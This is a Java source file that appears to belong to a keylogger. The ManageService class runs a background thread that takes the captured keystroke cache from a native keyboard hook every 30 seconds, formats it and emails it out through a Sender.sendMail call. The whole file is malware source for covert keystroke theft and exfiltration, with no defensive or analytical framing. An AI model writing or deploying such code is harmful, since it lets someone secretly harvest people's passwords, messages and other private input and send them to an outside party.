package handlers;

import keys.NativeKeyBoard;


public class ManageService implements Runnable {
	
	private NativeKeyBoard keyboard;
	private Thread service;
	
	public ManageService() {
		keyboard = new NativeKeyBoard();
		service = new Thread(this, "Manage Service");
		service.start();
	}
	
	public NativeKeyBoard getKeyBoard() {
		return keyboard;
	}
	
	@Override
	public void run() {
		System.out.println("Running code.");
		long start = System.nanoTime();
		while(true) {
			long elapsed = (System.nanoTime() - start) / 1_000_000;
			if(elapsed > 30_000 * 1) {
				try {
					Sender.sendMail(Utils.prettyPrint(keyboard.getKeyCache()));
					keyboard.onSend();
				} catch (Throwable e) {
					e.printStackTrace();
					keyboard.onFail();
				}
				start = System.nanoTime();
			}
		}
	}

}
